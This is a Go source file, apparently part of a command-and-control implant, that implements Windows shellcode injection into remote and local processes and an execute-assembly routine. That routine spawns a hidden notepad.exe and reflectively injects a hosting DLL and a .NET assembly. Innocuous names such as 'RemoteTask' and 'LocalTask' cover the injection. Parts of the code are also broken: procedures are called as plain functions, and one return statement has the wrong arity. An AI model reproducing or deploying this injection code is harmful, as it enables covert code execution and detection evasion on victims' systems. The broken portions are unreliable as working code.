package taskrunner

import (
	"bytes"
	"fmt"
	"io"
	"os/exec"
	"syscall"
	"unsafe"

	// {{if .Debug}}
	"log"
	// {{else}}{{end}}
)

const (
	MEM_COMMIT          = 0x001000
	MEM_RESERVE         = 0x002000
	BobLoaderOffset     = 0x00000af0
	PROCESS_ALL_ACCESS  = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xfff
	MAX_ASSEMBLY_LENGTH = 1025024
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	virtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
	virtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
	writeProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
	createRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
	createThread       = kernel32.MustFindProc("CreateThread")
)

func sysAlloc(size int) (uintptr, error) {
	n := uintptr(size)
	addr, _, err := virtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return 0, err
	}
	return addr, nil
}

func ptr(val interface{}) uintptr {
	switch val.(type) {
	case string:
		return uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(val.(string))))
	case int:
		return uintptr(val.(int))
	default:
		return uintptr(0)
	}
}

// injectTask - Injects shellcode into a process handle
func injectTask(processHandle syscall.Handle, data []byte) error {

	// Create native buffer with the shellcode
	dataSize := len(data)
	// {{if .Debug}}
	log.Println("creating native data buffer ...")
	// {{end}}
	dataAddr, _, err := virtualAlloc.Call(0, ptr(dataSize), MEM_RESERVE|MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
	if dataAddr == 0 {
		return err
	}
	dataBuf := (*[9999999]byte)(unsafe.Pointer(dataAddr))
	for index, value := range data {
		dataBuf[index] = value
	}

	// Remotely allocate memory in the target process
	// {{if .Debug}}
	log.Println("allocating remote process memory ...")
	// {{end}}
	remoteAddr, _, err := virtualAllocEx.Call(uintptr(processHandle), 0, ptr(dataSize), MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
	// {{if .Debug}}
	log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
	// {{end}}
	if remoteAddr == 0 {
		// {{if .Debug}}
		log.Println("[!] failed to allocate remote process memory")
		// {{end}}
		return err
	}

	// Write the shellcode into the remotely allocated buffer
	writeMemorySuccess, _, err := writeProcessMemory.Call(uintptr(processHandle), uintptr(remoteAddr), uintptr(dataAddr), ptr(dataSize), 0)
	// {{if .Debug}}
	log.Printf("writeprocessmemory returned: writeMemorySuccess = %v, err = %v", writeMemorySuccess, err)
	// {{end}}
	if writeMemorySuccess == 0 {
		// {{if .Debug}}
		log.Printf("[!] failed to write data into remote process")
		// {{end}}
		return err
	}

	// Create the remote thread to where we wrote the shellcode
	// {{if .Debug}}
	log.Println("successfully injected data, starting remote thread ....")
	// {{end}}
	createThreadSuccess, _, err := createRemoteThread.Call(uintptr(processHandle), 0, 0, uintptr(remoteAddr), 0, 0, 0)
	// {{if .Debug}}
	log.Printf("createremotethread returned: createThreadSuccess = %v, err = %v", createThreadSuccess, err)
	// {{end}}
	if createThreadSuccess == 0 {
		// {{if .Debug}}
		log.Printf("[!] failed to create remote thread")
		// {{end}}
		return err
	}
	return nil
}

// RermoteTask - Injects Task into a processID using remote threads
func RemoteTask(processID int, data []byte) error {
	processHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))
	if processHandle == 0 {
		return err
	}
	err = injectTask(processHandle, data)
	if err != nil {
		return err
	}
	return nil
}

func LocalTask(data []byte) error {
	size := len(data)
	addr, _ := sysAlloc(size)
	buf := (*[9999999]byte)(unsafe.Pointer(addr))
	for index := 0; index < size; index++ {
		buf[index] = data[index]
	}
	// {{if .Debug}}
	log.Printf("creating local thread with start address: 0x%08x", addr)
	// {{end}}
	_, _, err := createThread.Call(0, 0, addr, 0, 0, 0)
	return err
}

func ExecuteAssembly(hostingDll, assembly []byte, params string) (string, error) {

	if len(assembly) > MAX_ASSEMBLY_LENGTH {
		return fmt.Errorf("please use an assembly smaller than %d", MAX_ASSEMBLY_LENGTH)
	}
	cmd := exec.Command("notepad.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	var stdoutBuf, stderrBuf bytes.Buffer
	stdoutIn, _ := cmd.StdoutPipe()
	stderrIn, _ := cmd.StderrPipe()

	var errStdout, errStderr error
	cmd.Start()
	pid := cmd.Process.Pid
	// OpenProcess with PROC_ACCESS_ALL
	handle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
	if err != nil {
		return "", err
	}
	// VirtualAllocEx to allocate a new memory segment into the target process
	hostingDllAddr, err := virtualAllocEx(handle, 0, uint32(len(hostingDll)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return "", err
	}
	// WriteProcessMemory to write the reflective loader into the process
	_, err = writeProcessMemory(handle, hostingDllAddr, unsafe.Pointer(&hostingDll[0]), uint32(len(hostingDll)))
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)
	// {{end}}
	// Total size to allocate = assembly size + 1024 bytes for the args
	totalSize := uint32(MAX_ASSEMBLY_LENGTH)
	// VirtualAllocEx to allocate another memory segment for hosting the .NET assembly and args
	assemblyAddr, err := virtualAllocEx(handle, 0, totalSize, MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
	if err != nil {
		return "", err
	}
	// Padd arguments with 0x00 -- there must be a cleaner way to do that
	paramsBytes := []byte(params)
	padding := make([]byte, 1024-len(params))
	final := append(paramsBytes, padding...)
	// Final payload: params + assembly
	final = append(final, assembly...)
	// WriteProcessMemory to write the .NET assembly + args
	_, err = writeProcessMemory(handle, assemblyAddr, unsafe.Pointer(&final[0]), uint32(len(final)))
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(final), assemblyAddr)
	// {{end}}
	// CreateRemoteThread(DLL addr + offset, assembly addr)
	attr := new(syscall.SecurityAttributes)
	_, _, err = createRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0)
	if err != nil {
		return "", err
	}

	go func() {
		_, errStdout = io.Copy(&stdoutBuf, stdoutIn)
	}()
	_, errStderr = io.Copy(&stderrBuf, stderrIn)

	if errStdout != nil || errStderr != nil {
		// {{if .Debug}}
		log.Fatal("failed to capture stdout or stderr\n")
		// {{end}}
	}
	outStr, errStr := string(stdoutBuf.Bytes()), string(stderrBuf.Bytes())
	if len(errStr) > 1 {
		return "", fmt.Errorf(errStr)
	}
	return outStr, nil
}
